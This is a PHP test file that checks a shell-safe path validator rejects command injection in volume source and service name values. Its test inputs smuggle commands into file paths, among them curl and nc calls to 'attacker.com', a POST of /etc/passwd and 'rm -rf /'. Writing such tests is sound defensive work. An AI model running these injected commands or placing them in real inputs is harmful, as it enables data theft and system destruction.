<?php

test('allows safe paths without special characters', function () {
    $safePaths = [
        '/var/lib/data',
        './relative/path',
        'named-volume',
        'my_volume_123',
        '/home/user/app/data',
        'C:/Windows/Path',
        '/path-with-dashes',
        '/path_with_underscores',
        'volume.with.dots',
    ];

    foreach ($safePaths as $path) {
        expect(fn () => validateShellSafePath($path, 'test'))->not->toThrow(Exception::class);
    }
});

test('blocks backtick command substitution', function () {
    $path = '/tmp/pwn`curl attacker.com`';

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class, 'backtick');
});

test('blocks dollar-paren command substitution', function () {
    $path = '/tmp/pwn$(cat /etc/passwd)';

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class, 'command substitution');
});

test('blocks pipe operators', function () {
    $path = '/tmp/file | nc attacker.com 1234';

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class, 'pipe');
});

test('blocks semicolon command separator', function () {
    $path = '/tmp/file; curl attacker.com';

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class, 'separator');
});

test('blocks ampersand operators', function () {
    $paths = [
        '/tmp/file & curl attacker.com',
        '/tmp/file && curl attacker.com',
    ];

    foreach ($paths as $path) {
        expect(fn () => validateShellSafePath($path, 'test'))
            ->toThrow(Exception::class, 'operator');
    }
});

test('blocks redirection operators', function () {
    $paths = [
        '/tmp/file > /dev/null',
        '/tmp/file < input.txt',
        '/tmp/file >> output.log',
    ];

    foreach ($paths as $path) {
        expect(fn () => validateShellSafePath($path, 'test'))
            ->toThrow(Exception::class);
    }
});

test('blocks newline command separator', function () {
    $path = "/tmp/file\ncurl attacker.com";

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class, 'newline');
});

test('blocks tab character as token separator', function () {
    $path = "/tmp/file\tcurl attacker.com";

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class, 'tab');
});

test('blocks complex command injection with the example from issue', function () {
    $path = '/tmp/pwn`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`';

    expect(fn () => validateShellSafePath($path, 'volume source'))
        ->toThrow(Exception::class);
});

test('blocks nested command substitution', function () {
    $path = '/tmp/$(echo $(whoami))';

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class, 'command substitution');
});

test('blocks variable substitution patterns', function () {
    $paths = [
        '/tmp/${PWD}',
        '/tmp/${PATH}',
        'data/${USER}',
    ];

    foreach ($paths as $path) {
        expect(fn () => validateShellSafePath($path, 'test'))
            ->toThrow(Exception::class);
    }
});

test('provides context-specific error messages', function () {
    $path = '/tmp/evil`command`';

    try {
        validateShellSafePath($path, 'volume source');
        expect(false)->toBeTrue('Should have thrown exception');
    } catch (Exception $e) {
        expect($e->getMessage())->toContain('volume source');
    }

    try {
        validateShellSafePath($path, 'service name');
        expect(false)->toBeTrue('Should have thrown exception');
    } catch (Exception $e) {
        expect($e->getMessage())->toContain('service name');
    }
});

test('handles empty strings safely', function () {
    expect(fn () => validateShellSafePath('', 'test'))->not->toThrow(Exception::class);
});

test('allows paths with spaces', function () {
    // Spaces themselves are not dangerous in properly quoted shell commands
    // The escaping should be handled elsewhere (e.g., escapeshellarg)
    $path = '/path/with spaces/file';

    expect(fn () => validateShellSafePath($path, 'test'))->not->toThrow(Exception::class);
});

test('blocks multiple attack vectors in one path', function () {
    $path = '/tmp/evil`curl attacker.com`; rm -rf /; echo "pwned" > /tmp/hacked';

    expect(fn () => validateShellSafePath($path, 'test'))
        ->toThrow(Exception::class);
});
